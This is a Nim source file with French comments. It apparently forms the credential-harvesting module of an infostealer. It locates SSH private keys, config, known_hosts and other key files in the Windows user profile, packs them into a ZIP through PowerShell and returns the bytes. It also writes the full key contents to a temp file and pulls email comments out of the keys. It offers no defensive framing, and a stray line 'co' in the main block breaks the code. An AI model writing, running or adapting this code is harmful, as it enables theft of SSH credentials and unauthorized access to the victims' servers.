import os, strutils, times

proc extractSSHKeys*(): seq[string] =
  ## Extrait toutes les clés SSH privées et fichiers de config
  result = @[]
  
  let userProfile = getEnv("USERPROFILE")
  let sshDir = userProfile / ".ssh"
  
  if not dirExists(sshDir):
    return result
  
  # Listes des fichiers à capturer
  let targetFiles = [
    "id_rsa",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
    "id_ecdsa_sk",
    "id_ed25519_sk",
    "config",
    "known_hosts",
    "authorized_keys"
  ]
  
  for file in targetFiles:
    let fullPath = sshDir / file
    if fileExists(fullPath):
      result.add(fullPath)
  
  # Chercher d'autres fichiers .key et .pem
  for file in walkFiles(sshDir / "*.key"):
    if file notin result:
      result.add(file)
  
  for file in walkFiles(sshDir / "*.pem"):
    if file notin result:
      result.add(file)
  
  for file in walkFiles(sshDir / "*_key"):
    if file notin result:
      result.add(file)

proc packSSHKeys*(): string =
  ## Crée une archive des clés SSH trouvées
  let keys = extractSSHKeys()
  
  if keys.len == 0:
    return ""
  
  let tempDir = getTempDir() & "ssh_keys_" & $getCurrentProcessId()
  createDir(tempDir)
  
  # Copier les fichiers
  for key in keys:
    let dest = tempDir / extractFilename(key)
    copyFile(key, dest)
  
  # Créer un ZIP
  let zipFile = getTempDir() & "ssh_keys.zip"
  let cmd = "powershell -c \"Compress-Archive -Path '" & tempDir & "\\*' -DestinationPath '" & zipFile & "' -Force\""
  discard execShellCmd(cmd)
  
  # Lire le ZIP
  var result = ""
  if fileExists(zipFile):
    result = readFile(zipFile)
  
  # Nettoyage
  removeDir(tempDir)
  removeFile(zipFile)
  
  return result

proc getSSHKeysInfo*(): string =
  ## Retourne des infos sur les clés trouvées (sans les copier)
  let keys = extractSSHKeys()
  
  if keys.len == 0:
    return "Aucune clé SSH trouvée"
  
  result = "Clés SSH trouvées:\n"
  for key in keys:
    let size = getFileSize(key)
    result &= "  - " & extractFilename(key) & " (" & $size & " bytes)\n"
    
    # Pour les clés privées, essayer de lire le commentaire (email)
    if key.endsWith("rsa") or key.endsWith("ed25519") or key.endsWith("ecdsa"):
      try:
        let content = readFile(key)
        for line in content.splitLines():
          if line.startsWith("-----BEGIN"):
            continue
          if line.contains("@") and line.contains("="):
            # Extraire le commentaire
            let parts = line.split(" ")
            if parts.len >= 3:
              result &= "    Commentaire: " & parts[^1] & "\n"
            break
      except:
        discard

proc saveSSHKeys*(): string =
  ## Sauvegarde les clés dans un fichier (pour debug)
  let keys = extractSSHKeys()
  
  if keys.len == 0:
    return ""
  
  let outputFile = getTempDir() & "ssh_keys_" & $getCurrentProcessId() & ".txt"
  var f = open(outputFile, fmWrite)
  f.writeLine("SSH KEYS EXTRACTED - " & getTime().format("yyyy-MM-dd HH:mm:ss"))
  f.writeLine(repeat("=", 80))
  f.writeLine("")
  
  for key in keys:
    f.writeLine("File: " & key)
    try:
      let content = readFile(key)
      f.writeLine("Content:")
      f.writeLine(content)
    except:
      f.writeLine("  [Unable to read]")
    f.writeLine(repeat("-", 40))
  
  f.close()
  result = outputFile

when isMainModule:
  echo "[*] Extraction des clés SSH"
  echo repeat("=", 50)
  
  let keys = extractSSHKeys()
  co
  if keys.len == 0:
    echo "[-] Aucune clé SSH trouvée"
    echo "[*] Dossier vérifié: ", getEnv("USERPROFILE") / ".ssh"
  else:
    echo "[+] ", keys.len, " fichier(s) trouvé(s):"
    
    for key in keys:
      let size = getFileSize(key)
      echo "    📁 ", extractFilename(key), " (", size, " bytes)"
    
    # Créer une archive
    let zipData = packSSHKeys()
    if zipData != "":
      echo "\n[+] Archive créée: ", zipData.len, " bytes"
      
      # Sauvegarder localement pour test
      writeFile("ssh_keys_test.zip", zipData)
      echo "[+] Sauvegardé: ssh_keys_test.zip"
    
    # Alternative: sauvegarde en texte
    let txtFile = saveSSHKeys()
    if txtFile != "":
      echo "[+] Détails sauvegardés: ", txtFile